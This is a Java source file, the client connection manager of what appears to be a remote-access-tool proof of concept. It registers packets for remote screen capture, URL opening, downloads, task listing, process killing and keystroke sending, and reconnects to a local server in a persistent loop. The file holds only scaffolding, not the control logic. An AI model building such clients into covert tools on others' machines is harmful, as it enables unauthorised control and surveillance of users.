package com.poc.net;

import java.awt.Dimension;
import java.awt.Image;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;

import com.esotericsoftware.kryo.Kryo;
import com.esotericsoftware.kryonet.Client;
import com.poc.packet.Packet;
import com.poc.packet.Packet10Kill;
import com.poc.packet.Packet11SendKeys;
import com.poc.packet.Packet1Connected;
import com.poc.packet.Packet2Disconnect;
import com.poc.packet.Packet3RequestRC;
import com.poc.packet.Packet4RCImage;
import com.poc.packet.Packet5Message;
import com.poc.packet.Packet6Url;
import com.poc.packet.Packet7Download;
import com.poc.packet.Packet8Tasks;
import com.poc.packet.Packet9RefreshTasks;

public class ClientManager {

	private Client client;
	private final ListenerManager listenerManager;
	private final WriteManager writeManager;
	private final RemoteControlManager rcManager;
	
	public ClientManager() {
		client = new Client();
		listenerManager = new ListenerManager(this);
		writeManager = new WriteManager(this);
		rcManager = new RemoteControlManager(this);
		registerClasses();
		connect();
	}
	
	private void registerClasses() {
		Kryo kryo = client.getKryo();
		
		kryo.register(Packet1Connected.class);
		kryo.register(Packet2Disconnect.class);
		kryo.register(Packet3RequestRC.class);
		kryo.register(byte.class);
		kryo.register(byte[].class);
		kryo.register(Packet4RCImage.class);
		kryo.register(Packet5Message.class);
		kryo.register(Packet6Url.class);
		kryo.register(Packet7Download.class);
		kryo.register(String[].class);
		kryo.register(Packet8Tasks.class);
		kryo.register(Packet9RefreshTasks.class);
		kryo.register(Packet10Kill.class);
		kryo.register(Packet11SendKeys.class);
	}
	
	public void connect() {
		try {
			client.start();
			client.connect(5000, "localhost", 54555, 54777);
			client.addListener(listenerManager);
			Packet1Connected p1 = new Packet1Connected();
			Toolkit toolkit =  Toolkit.getDefaultToolkit();
			Dimension dim = toolkit.getScreenSize();
			p1.width = dim.width;
			p1.height = dim.height;
			writeManager.writeToServerTCP(p1);
			System.out.println("Connected");
			new Thread(new Runnable() {

				@Override
				public void run() {
					try {
						//Keep alive
						while (client.isConnected()) {
							Thread.sleep(1000);
						}
						if (!client.isConnected())
							connect();
					} catch (InterruptedException e) {
						e.printStackTrace();
					}
				}
				
			}).start();
		} catch (Exception e) {
			try {
				Thread.sleep(15000);
				connect();
			} catch (Exception e1) {
				e1.printStackTrace();
			}
		}
	}
	
	public Client getClient() {
		return client;
	}
	
	public WriteManager getWriteManager() {
		return writeManager;
	}
	
	public RemoteControlManager getRCManager() {
		return rcManager;
	}
	
}
